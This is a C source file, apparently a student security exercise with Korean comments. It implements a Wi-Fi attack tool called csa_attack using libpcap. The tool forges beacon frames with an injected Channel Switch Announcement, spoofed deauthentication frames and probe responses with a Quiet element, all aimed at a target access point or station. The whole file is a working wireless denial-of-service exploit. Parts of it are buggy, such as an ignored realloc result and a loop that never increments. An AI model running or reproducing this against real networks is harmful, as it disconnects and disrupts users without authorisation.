#include <pcap.h>
#include <stdbool.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define MAC_ADDR_LEN 6
typedef struct Proberesponse // 44여야함
{
    // Radio 8
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_int present_flag;
    // Probe Response 24
    u_short type;
    u_short dur;
    u_char mac_Des[MAC_ADDR_LEN];
    u_char mac_src[MAC_ADDR_LEN];
    u_char mac_bssid[MAC_ADDR_LEN];
    u_short fs_number;
    // Fixed  parameters 12
    u_int64_t time;
    u_short interval;
    u_short capabilities;

} probe; // 44

typedef struct Deauth
{
    // Radio 8
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_int present_flag;
    // Deauth 24
    u_short type;
    u_short dur;
    u_char mac_Des[MAC_ADDR_LEN];
    u_char mac_src[MAC_ADDR_LEN];
    u_char mac_bssid[MAC_ADDR_LEN];
    u_short fs_number;
    // Fixed  parameters 2
    u_char Reasoncode;
} Dth; // 34;

typedef struct radiotap
{
    u_char hdr_rev;
    u_char hdr_pad;
    u_short hdr_len;
    u_char present_flag[12]; //이 길이 가변이라 보내는 놈의 안테나길이에 따라 가변임
    u_char flags;
} Radio;

typedef struct wlan_Beacon_hdr
{
    // u_char type;                    //Type/Subtype
    u_short type;                   // Frame Control Field, [1000 ....] : subtype-8, [.... 00..] : Management frame, [.... ..00] : version
    u_short dur;                    // Duration
    u_char mac_des[MAC_ADDR_LEN];   // Destination address
    u_char mac_src[MAC_ADDR_LEN];   // Source address
    u_char mac_bssid[MAC_ADDR_LEN]; // BSS Id
    u_char Frag_num : 4;            // Fragment number
    u_int Seq_num : 12;             // Sequence number
} BeaconHd;

typedef struct tagged_parameters
{
    u_char tag_number;
    u_char tag_length;
} tag;

void usage()
{
    printf("syntax: csa_attack <interface> <AP mac> <Ch> \n");
    printf("Broadcast sample: csa_attack wlan0 11:22:33:44:55:66 13\n");
    printf("syntax: quit_attack <interface> <AP mac> <STA mac> <Ch> <ssid>\n");
    printf("Unicast sample: csa_attack wlan0 11:22:33:44:55:66 aa:bb:cc:dd:ee:ff 13 KITRI_DEV2.4");
}

typedef struct
{
    char *dev_;
} Param;

Param param = {
    .dev_ = NULL};

bool parse(Param *param, int argc, char *argv[])
{

    if (argc != 4 && argc != 6)
    {
        printf("argc : %d\n", argc);
        usage();
        return false;
    }
    param->dev_ = argv[1];
    return true;
}

void Mac_(const char *arr, u_char mac_addr[6]);
bool isBeacon(const u_char *packet);
bool arrncmp(const char *arr1, const char *arr2, int len);
void addCSA(u_char *packet, int len, int pivot); //배열 공간 생성
int sendDeauth(unsigned char *Interface, const u_char AP_mac[6], const u_char STA_mac[6]);
//void parseAPmac();

int main(int argc, char *argv[])
{
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);

    printf("argc : %d\n",argc);

    if (!parse(&param, argc, argv))
        return -1;

    unsigned char *Interface = argv[1];
    unsigned char *Input_AP_MAC = argv[2];
    unsigned char *Input_STA_MAC;
    //unsigned char *Input_ChangeCh;
    unsigned char *Input_Ssid;
    unsigned char *Input_Type;
    unsigned char *Input_AP_Ch;

    if (argc == 6)
    { // Unicast
        Input_STA_MAC = argv[3];
        Input_AP_Ch = argv[4];
        Input_Ssid = argv[5];
        // printf("ChangeCh : %s\n",Input_Ch);
    }
    else if (argc == 4)
    { // Broadcast
        Input_STA_MAC = "ff:ff:ff:ff:ff:ff";
        Input_AP_Ch = argv[3];
        // printf("ChangeCh : %s\n",Input_Ch);
    }
    unsigned char ChangeCh = 100;
    unsigned char ApCh = atoi(Input_AP_Ch);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    while (true)
    {
        struct pcap_pkthdr *header;
        const u_char *packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0)
            continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
        {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        Radio *rad;
        rad = (Radio *)packet;
        u_char AP_MAC[6];
        bool isFcS;

        u_char *send_packet;
        if (argc == 6)
        { // Unicast
            // Probe 초기화
    printf("??");
            probe prb;
            prb.hdr_rev = 0x0;
            prb.hdr_pad = 0x0;
            prb.hdr_len = 0x8;
            prb.present_flag = 0x0;
            prb.type = 0x0080; // Quit
            prb.dur = 0x0;
            Mac_("ff:ff:ff:ff:ff:ff", prb.mac_Des);
            Mac_(Input_AP_MAC, prb.mac_src);
            Mac_(Input_AP_MAC, prb.mac_bssid);
            // printf("Des : ");for(int i=0;i<6;i++){printf("%x ",prb.mac_Des[i]);}printf("\n");
            // printf("Src : ");for(int i=0;i<6;i++){printf("%x ",prb.mac_src[i]);}printf("\n");
            // printf("bssid : ");for(int i=0;i<6;i++){printf("%x ",prb.mac_bssid[i]);}printf("\n");
            prb.fs_number = 0x0;
            prb.time = 0x0;
            prb.interval = 0x0064;
            prb.capabilities = 0x1111;
            int ssid_len = strlen(Input_Ssid);
            // printf("ssid_len : %d\n", ssid_len);
            int send_packet_len = 44 + ssid_len + 2 + (2+1)+ 6+2; // tag : SSid, Ds, Quit
            send_packet = (u_char *)malloc(send_packet_len);
            // printf("packet size : %d\n",sizeof(prb));
            memcpy(send_packet, &prb, 44);
            
            // printf("Des : ");for(int i=0;i<6;i++){printf("%x ",*(send_packet+i+8+4));}printf("\n");
            // printf("Src : ");for(int i=6;i<12;i++){printf("%x ",*(send_packet+i+8+4));}printf("\n");
            // printf("bssid : ");for(int i=12;i<18;i++){printf("%x ",*(send_packet+i+8+4));}printf("\n");
            int packet_point = 44;

            *(send_packet + packet_point) = 0x0; // ssid num
            packet_point++;
            *(send_packet + packet_point) = ssid_len; // ssid len
            packet_point++;
            // printf("point : %d\n",packet_point);
            for (int i = 0, packet_point_before = packet_point; packet_point < packet_point_before + ssid_len; packet_point++, i++)
            {
                // printf("!point : %d\n",packet_point);
                *(send_packet + packet_point) = *(Input_Ssid + i);
            } // ssid data

            *(send_packet + packet_point) = 0x3; // Ds num
            packet_point++;
            *(send_packet + packet_point) = 0x1; // Ds len
            packet_point++;
            *(send_packet + packet_point) = ApCh; // Current Channel
            packet_point++;
            *(send_packet + packet_point) = 0x28; // Quit
            packet_point++;
            *(send_packet + packet_point) = 0x6; // Quit len
            packet_point++;
            *(send_packet + packet_point) = 0x1; // Count
            packet_point++;
            *(send_packet + packet_point) = 0xff; // Period
            packet_point++;
            *(send_packet + packet_point) = 0xff; // Dur
            packet_point++;
            *(send_packet + packet_point) = 0xff; // Dur
            packet_point++;
            *(send_packet + packet_point) = 0x0; // Offset
            packet_point++;
            *(send_packet + packet_point) = 0x0; // Offset

            // printf("point : %d\n",packet_point);
            // printf("packet_len : %d\n",send_packet_len);





                                                 // printf("Des : ");for(int i=0;i<6;i++){printf("%x ",*(send_packet+i+8+4));}printf("\n");
                                                 // printf("Src : ");for(int i=6;i<12;i++){printf("%x ",*(send_packet+i+8+4));}printf("\n");
                                                 // printf("bssid : ");for(int i=12;i<18;i++){printf("%x ",*(send_packet+i+8+4));}printf("\n");



                sendDeauth(Interface, Input_AP_MAC, Input_STA_MAC);
                for(int i=0;i<4;i++){
                printf("Quit send!!!\n");
                if (pcap_sendpacket(pcap, send_packet, send_packet_len) != 0)
                {
                    fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                    return -1;
                }
                }

            free(send_packet);
        }
        else if (argc == 4)
        { // Broadcast

            if (isBeacon(packet))
            {
                if ((rad->flags >> 4) == 1)
                {
                    isFcS = true;
                    // printf("FcS is %x\n", rad->flags);
                    // printf("FcS : true!!\n");
                }
                else
                {
                    isFcS = false;
                    // printf("FcS is %x\n", rad->flags);
                    // printf("FcS : false!!\n");
                    // for (int i = 0; i < header->caplen; i++)
                    // {
                    //     printf("%x ", *(packet + i));
                    //     if (i % 15 == 0 && i != 0)
                    //     {
                    //         printf("\n");
                    //     }
                    // }

                    // return 0;
                }
                Mac_(Input_AP_MAC, AP_MAC);

                // for (int i = 0; i < 6; i++){printf("%x ", AP_MAC[i]);}printf("\n");

                BeaconHd *becH;
                becH = (BeaconHd *)(packet + rad->hdr_len);
                // printf("?\n");
                if (arrncmp(AP_MAC, becH->mac_src, 6))
                {
                    // for (int i = 0; i < 6; i++)
                    // {
                    //     printf("%x ", AP_MAC[i]);
                    // }
                    // printf("\n");
                    // for (int i = 0; i < 6; i++)
                    // {
                    //     printf("%x ", becH->mac_shost[i]);
                    // }
                    // printf("\n");

                    send_packet = (u_char *)malloc(sizeof(u_char) * (header->caplen));

                    memcpy(send_packet, packet, header->caplen);
                    
                    // for (int i = 0; i < header->caplen; i++)
                    // {
                    //     printf("%x ", *(send_packet + i));
                    //     if (i % 15 == 0 && i != 0)
                    //     {
                    //         printf("\n");
                    //     }
                    // }
                    //패킷 전송 (우리집 mac : 00:01:36:A4:CB:79)
                    *(send_packet + 16) = 0x00; // fcs
                    // CSA tag
                    Radio *rad;
                    rad = (Radio *)send_packet;
                    u_int not_tag_len = (rad->hdr_len) + 24 + 12;
                    u_int tag_len = (header->caplen) - 4 - not_tag_len;
                    u_int total_len = not_tag_len + tag_len;
                    // printf("tag len : %d\n",tag_len);
                    tag *tagged;
                    bool csa_inject = false;

                    for (int i = 0; i < tag_len; i)
                    {
                        tagged = (tag *)(send_packet + not_tag_len + i);
                        // printf("@@@\n");
                        // printf("tag num : %d tag len : %d\n",tagged->tag_number,tagged->tag_length);
                        if (tagged->tag_number > 37)
                        {

                            // printf("tag num : %x tag len : %x\n", tagged->tag_number, tagged->tag_length);
                            total_len += 5;
                            // printf("total_len : %d\n",total_len);
                            realloc(send_packet, sizeof(u_char) * ((header->caplen) + 5)); // 5byte 증가
                            // realloc(send_packet, sizeof(u_char) * (total_len)); // 5byte 증가
                            /*
                                여기에서 CSA 추가
                            */
                            // printf("i : %d\n",i);
                            addCSA(send_packet, total_len, not_tag_len + i - 1); // csa를 넣을 공간 생성
                            *(send_packet + not_tag_len + i) = 0x25;
                            *(send_packet + not_tag_len + i + 1) = 0x3;
                            *(send_packet + not_tag_len + i + 2) = 0x1;
                            *(send_packet + not_tag_len + i + 3) = ChangeCh;
                            *(send_packet + not_tag_len + i + 4) = 0x1;
                            break;
                        }
                        i += tagged->tag_length + 2;
                    }
                    if (csa_inject == false)
                    { // tag를 끝까지 돌아도 37(CSA)을 넘는 테그가 없다면
                    }
                    if (isFcS)
                    {
                        // total_len -= 4;
                    }

                    for (int i = 0; i < 4; i++)
                    {
                        printf("[%d] send packet !!! \n", i);
                        if (pcap_sendpacket(pcap, send_packet, total_len) != 0)
                        {
                            fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
                            return -1;
                        }
                    }
                    
                    free(send_packet);
                }
            }
            else
            {
                continue;
            }
        }
    }

    pcap_close(pcap);
}

void Mac_(const char *arr, u_char mac_addr[6])
{
    int a;
    if (strlen(arr) != 17)
    {
        printf("Maclen error!!\n");
    }
    char cpyarr[18];
    memcpy(cpyarr, arr, 17);
    // printf("arr : %s\n",arr);
    for (int i = 0; i < 6; i++) //입력Mac값의 콜론 제거
    {
        cpyarr[i * 3 + 2] = '\0';
        sscanf((const char *)&cpyarr[3 * i], "%x", &a);
        mac_addr[i] = (u_char)a;
    }
}

bool isBeacon(const u_char *packet)
{
    Radio *rad;
    rad = (Radio *)packet;
    BeaconHd *bec;
    bec = (BeaconHd *)(packet + rad->hdr_len);
    if (htons(bec->type) == 0x8000)
    {
        return true;
    }
    else
    {
        return false;
    }
}

bool arrncmp(const char *arr1, const char *arr2, int len)
{
    for (int i = 0; i < len; i++)
    {
        if (arr1[i] != arr2[i])
        {
            return false;
        }
    }
    return true;
}

void addCSA(u_char *arr, int len, int pivot)
{ // len : 배열의 길이, pivot : 어디까지 뒤로 밀어낼지
    // realloc으로 미리 공간 늘려주고 보내줘야함
    //로
    for (int i = len - 1 - 5; i >= pivot; i--)
    {
        arr[i + 5] = arr[i];
    }
}

int sendDeauth(unsigned char *Interface, const u_char AP_mac[6], const u_char STA_mac[6])

{   
    setbuf(stdin, NULL);
    setbuf(stdout, NULL);
    setbuf(stderr, NULL);
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *pcap = pcap_open_live(Interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL)
    {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.dev_, errbuf);
        return -1;
    }
    Dth Deauth;
    Deauth.hdr_rev = 0x0;
    Deauth.hdr_pad = 0x0;
    Deauth.hdr_len = 0x8;
    Deauth.present_flag = 0x0;
    Deauth.type = 0x00c0; // Deauth
    Deauth.dur = 0x0;
    Mac_(STA_mac, Deauth.mac_Des);
    Mac_(AP_mac, Deauth.mac_src);
    Mac_(AP_mac, Deauth.mac_bssid);
    Deauth.fs_number = 0x0;
    Deauth.Reasoncode = 0x0007; // 07 00
    //u_char *send_packet_Dth;
    //printf("size : %d\n",sizeof(Deauth));
    //memcpy(send_packet_Dth, &Deauth, 34);

    printf("Deauth send!!!\n");
    if (pcap_sendpacket(pcap, (char*)&Deauth, 34) != 0)
    {
        fprintf(stderr, "\nError sending the packet: %s\n", pcap_geterr(pcap));
    }
    pcap_close(pcap);
}